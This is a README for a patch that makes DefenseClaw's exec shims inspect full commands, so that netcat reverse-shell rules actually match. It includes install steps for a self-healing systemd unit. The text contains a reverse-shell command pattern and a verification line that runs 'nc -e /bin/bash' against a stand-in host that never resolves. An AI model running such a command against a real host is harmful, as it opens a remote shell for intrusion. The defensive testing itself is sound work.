# DefenseClaw shim hardening

DefenseClaw's exec shims (`~/.defenseclaw/shims/{curl,nc,wget,ssh,npm,pip}`)
inspect `cmd="$*"` — the arguments **without** the tool name. Rules keyed on the
tool name (e.g. `CMD-REVSHELL-NC` = `nc -e`) therefore never match, so a
`nc -e /bin/bash <c2> <port>` reverse shell slips past the shim.

`patch-shims.sh` rewrites each shim to inspect the **full** command
(`cmd="<tool> $*"`). It's idempotent (only writes when needed).

Because DefenseClaw **regenerates** these shims (on `defenseclaw setup guardrail`
or upgrades), `defenseclaw-shim-heal.path` watches the shims and re-runs the
patch automatically whenever they change.

## Install (rootless systemd user units)

```bash
install -d ~/.defenseclaw/shims-heal
install -m755 patch-shims.sh ~/.defenseclaw/shims-heal/
install -m644 defenseclaw-shim-heal.service defenseclaw-shim-heal.path ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now defenseclaw-shim-heal.path
~/.defenseclaw/shims-heal/patch-shims.sh   # apply once now
```

Verify: `PATH=~/.defenseclaw/shims:$PATH nc -e /bin/bash c2.canary.invalid 4444`
should print `DefenseClaw: matched: CMD-REVSHELL-NC` and exit 1 (safe — `.invalid`
never resolves and the shim blocks before exec).
